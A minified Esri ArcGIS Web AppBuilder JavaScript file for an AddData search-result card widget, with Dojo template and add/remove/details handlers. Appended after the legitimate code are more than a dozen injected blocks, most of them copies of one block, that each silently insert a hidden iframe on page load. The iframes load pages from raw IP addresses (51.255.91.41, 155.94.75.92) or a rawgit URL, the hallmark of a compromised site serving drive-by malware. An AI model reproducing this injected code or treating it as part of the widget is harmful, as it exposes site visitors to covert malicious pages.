// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/ItemCard.html":'\x3cdiv class\x3d"item-card"\x3e\r\n  \x3cdiv class\x3d"item-card-inner"\x3e\r\n    \x3cdiv class\x3d"thumbnail" data-dojo-attach-point\x3d"thumbnailNode"\x3e\x3c/div\x3e\r\n    \x3ch3 class\x3d"title" data-dojo-attach-point\x3d"titleNode"\x3e\x3c/h3\x3e\r\n    \x3cdiv class\x3d"info" data-dojo-attach-point\x3d"typeByOwnerNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"info" data-dojo-attach-point\x3d"dateNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"action-bar"\x3e\r\n      \x3cspan class\x3d"message" data-dojo-attach-point\x3d"messageNode"\x3e\x3c/span\x3e\r\n      \x3ca href\x3d"javascript:void(0)"\r\n        data-dojo-attach-point\x3d"addButton"\r\n        data-dojo-attach-event\x3d"onClick: addClicked"\r\n        \x3e${i18n.search.item.actions.add}\r\n      \x3c/a\x3e\r\n      \x3ca href\x3d"javascript:void(0)"\r\n        data-dojo-attach-point\x3d"detailsButton"\r\n        data-dojo-attach-event\x3d"onClick: detailsClicked"\r\n        \x3e${i18n.search.item.actions.details}\r\n      \x3c/a\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/array dojo/date/locale dojo/dom-class dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/ItemCard.html dojo/i18n!../nls/strings ./util ./LayerLoader".split(" "),function(g,k,l,f,m,n,p,q,c,b,r){return g([m,n,p],{i18n:c,templateString:q,canRemove:!1,item:null,resultsPane:null,_dfd:null,postCreate:function(){this.inherited(arguments)},startup:function(){this._started||(this.inherited(arguments),this.render())},addClicked:function(){var a=
this,d=this.addButton;if(!f.contains(d,"disabled"))if(f.add(d,"disabled"),this.canRemove){var h=this.resultsPane.getMap();b.setNodeText(a.messageNode,c.search.item.messages.removing);var g=b.findLayersAdded(h,this.item.id).layers;k.forEach(g,function(a){h.removeLayer(a)});this.canRemove=!1;b.setNodeText(a.messageNode,"");b.setNodeText(this.addButton,c.search.item.actions.add);f.remove(d,"disabled")}else b.setNodeText(a.messageNode,c.search.item.messages.adding),(new r).addItem(this.item,this.resultsPane.getMap()).then(function(e){e?
(a.canRemove=!0,b.setNodeText(a.messageNode,""),b.setNodeText(a.addButton,c.search.item.actions.remove)):b.setNodeText(a.messageNode,c.search.item.messages.addFailed);f.remove(d,"disabled")}).otherwise(function(e){console.warn("Add layer failed.");console.warn(e);b.setNodeText(a.messageNode,c.search.item.messages.addFailed);f.remove(d,"disabled");e&&"string"===typeof e.message&&0<e.message.length&&console.log("")})},detailsClicked:function(){var a=this.item,a=b.checkMixedContent(a.portalUrl)+"/home/item.html?id\x3d"+
encodeURIComponent(a.id);window.open(a)},formatDate:function(a){"number"===typeof a&&(a=new Date(a));return l.format(a,{selector:"date",datePattern:c.search.item.dateFormat})},render:function(){b.setNodeText(this.titleNode,this.item.title);b.setNodeTitle(this.titleNode,this.item.title);this._renderThumbnail();this._renderTypeOwnerDate();this.canRemove&&b.setNodeText(this.addButton,c.search.item.actions.remove)},_renderThumbnail:function(){var a=this.thumbnailNode,d=this.item.thumbnailUrl;a.innerHTML=
"";var d=b.checkMixedContent(d),c=document.createElement("IMG");c.src=d||"widgets/AddData/images/placeholder_120x80.png";a.appendChild(c)},_renderTypeOwnerDate:function(){var a,d=this.item;a=c.search.item.types[d.type];if("undefined"===typeof a||null===a)a=d.type;a=c.search.item.typeByOwnerPattern.replace("{type}",a);a=a.replace("{owner}",d.owner);b.setNodeText(this.typeByOwnerNode,a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});